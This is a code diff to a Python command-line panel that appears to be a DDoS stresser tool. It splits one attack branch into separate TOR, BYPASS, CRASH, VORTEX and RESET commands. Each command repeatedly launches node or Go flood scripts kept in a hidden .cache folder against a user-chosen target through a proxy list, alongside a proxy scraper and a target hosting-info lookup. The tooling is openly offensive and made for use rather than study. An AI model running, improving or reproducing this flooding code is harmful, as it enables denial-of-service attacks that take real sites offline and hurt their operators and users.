@@ -156,56 +156,110 @@ def mn_lp():
                 ani_txt("👋 Goodbye, have a great day.", 0.02)
                 break
 
-            elif cmd in ["TOR", "BYPASS", "CRASH", "VORTEX"]:
+            elif cmd == "TOR":
                 try:
                     tg = parts[1]
                     mx_tm = int(parts[2])
                     ani_txt(
-                        f"Engaging Attack on {tg} for {mx_tm} seconds... 💥", 0.05)
+                        f"Engaging TOR attack on {tg} for {mx_tm} seconds... 💥", 0.05
+                    )
                     st_tm = t.time()
                     while t.time() - st_tm < mx_tm:
-                        if cmd == "TOR":
-                            rn_cmd(
-                                f'node bin/odd/.cache/TOR.js GET "{tg}" 600 50 90 root/proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full'
-                            )
-                            rn_cmd(f"python3 root/scrape.py &")
-                            rn_cmd(
-                                f'node bin/odd/.cache/TOR.js POST "{tg}" 600 50 90 root/proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full'
-                            )
-                        elif cmd == "BYPASS":
-                            rn_cmd(
-                                f"node bin/odd/.cache/BYPASS.js {tg} 600 100 10 root/proxy.txt"
-                            )
-                            rn_cmd(f"python3 root/scrape.py &")
-                            rn_cmd(
-                                f"node bin/odd/.cache/BYPASS.js {tg} 600 100 10 root/proxy.txt"
-                            )
-                        elif cmd == "CRASH":
-                            rn_cmd(
-                                f"go run bin/odd/.cache/CRASH.go {tg} 9999 get 600 nil"
-                            )
-                            rn_cmd(
-                                f"go run bin/odd/.cache/CRASH.go {tg} 9999 post 600 nil"
-                            )
-                        elif cmd == "VORTEX":
-                            rn_cmd(
-                                f"node bin/odd/.cache/VORTEX.js {tg} 600 100 10 root/proxy.txt"
-                            )
-                            rn_cmd(f"python3 root/scrape.py &")
-                            rn_cmd(
-                                f"node bin/odd/.cache/VORTEX.js {tg} 600 100 10 root/proxy.txt"
-                            )
-                        elif cmd == "RESET":
-                            rn_cmd(
-                                f"node bin/odd/.cache/RESET.js {tg} 600 100 10 root/proxy.txt"
-                            )
-                            rn_cmd(f"python3 root/scrape.py &")
-                            rn_cmd(
-                                f"node bin/odd/.cache/RESET.js {tg} 600 100 10 root/proxy.txt"
-                            )
+                        rn_cmd(
+                            f'node bin/odd/.cache/TOR.js GET "{tg}" 600 50 90 root/proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full'
+                        )
+                        rn_cmd(f"python3 root/scrape.py &")
+                        rn_cmd(
+                            f'node bin/odd/.cache/TOR.js POST "{tg}" 600 50 90 root/proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full'
+                        )
                         t.sleep(1)
                 except IndexError:
-                    print("❌ Invalid Command. Usage: <COMMAND> <TARGET> <TIME>")
+                    print("❌ Invalid Command. Usage: TOR <TARGET> <TIME>")
+                except Exception as e:
+                    print(f"❌ An error occurred: {e}")
+
+            elif cmd == "BYPASS":
+                try:
+                    tg = parts[1]
+                    mx_tm = int(parts[2])
+                    ani_txt(
+                        f"Engaging BYPASS attack on {tg} for {mx_tm} seconds... 💥",
+                        0.05,
+                    )
+                    st_tm = t.time()
+                    while t.time() - st_tm < mx_tm:
+                        rn_cmd(
+                            f"node bin/odd/.cache/BYPASS.js {tg} 600 100 10 root/proxy.txt"
+                        )
+                        rn_cmd(f"python3 root/scrape.py &")
+                        rn_cmd(
+                            f"node bin/odd/.cache/BYPASS.js {tg} 600 100 10 root/proxy.txt"
+                        )
+                        t.sleep(1)
+                except IndexError:
+                    print("❌ Invalid Command. Usage: BYPASS <TARGET> <TIME>")
+                except Exception as e:
+                    print(f"❌ An error occurred: {e}")
+
+            elif cmd == "CRASH":
+                try:
+                    tg = parts[1]
+                    mx_tm = int(parts[2])
+                    ani_txt(
+                        f"Engaging CRASH attack on {tg} for {mx_tm} seconds... 💥", 0.05
+                    )
+                    st_tm = t.time()
+                    while t.time() - st_tm < mx_tm:
+                        rn_cmd(f"go run bin/odd/.cache/CRASH.go {tg} 9999 get 600 nil")
+                        rn_cmd(f"go run bin/odd/.cache/CRASH.go {tg} 9999 post 600 nil")
+                        t.sleep(1)
+                except IndexError:
+                    print("❌ Invalid Command. Usage: CRASH <TARGET> <TIME>")
+                except Exception as e:
+                    print(f"❌ An error occurred: {e}")
+
+            elif cmd == "VORTEX":
+                try:
+                    tg = parts[1]
+                    mx_tm = int(parts[2])
+                    ani_txt(
+                        f"Engaging VORTEX attack on {tg} for {mx_tm} seconds... 💥",
+                        0.05,
+                    )
+                    st_tm = t.time()
+                    while t.time() - st_tm < mx_tm:
+                        rn_cmd(
+                            f"node bin/odd/.cache/VORTEX.js {tg} 600 100 10 root/proxy.txt"
+                        )
+                        rn_cmd(f"python3 root/scrape.py &")
+                        rn_cmd(
+                            f"node bin/odd/.cache/VORTEX.js {tg} 600 100 10 root/proxy.txt"
+                        )
+                        t.sleep(1)
+                except IndexError:
+                    print("❌ Invalid Command. Usage: VORTEX <TARGET> <TIME>")
+                except Exception as e:
+                    print(f"❌ An error occurred: {e}")
+
+            elif cmd == "RESET":
+                try:
+                    tg = parts[1]
+                    mx_tm = int(parts[2])
+                    ani_txt(
+                        f"Engaging RESET attack on {tg} for {mx_tm} seconds... 💥", 0.05
+                    )
+                    st_tm = t.time()
+                    while t.time() - st_tm < mx_tm:
+                        rn_cmd(
+                            f"node bin/odd/.cache/RESET.js {tg} 600 100 10 root/proxy.txt"
+                        )
+                        rn_cmd(f"python3 root/scrape.py &")
+                        rn_cmd(
+                            f"node bin/odd/.cache/RESET.js {tg} 600 100 10 root/proxy.txt"
+                        )
+                        t.sleep(1)
+                except IndexError:
+                    print("❌ Invalid Command. Usage: RESET <TARGET> <TIME>")
                 except Exception as e:
                     print(f"❌ An error occurred: {e}")
                 continue
@@ -214,8 +268,7 @@ def mn_lp():
                 try:
                     tr = parts[1]
                     ld_ani(f"Checking hosting info for {tr}", 1.5)
-                    response = re.get(
-                        f"https://check-host.net/ip-info?host={tr}")
+                    response = re.get(f"https://check-host.net/ip-info?host={tr}")
                     if response.status_code == 200:
                         soup = bs(response.text, "html.parser")
                         details = {
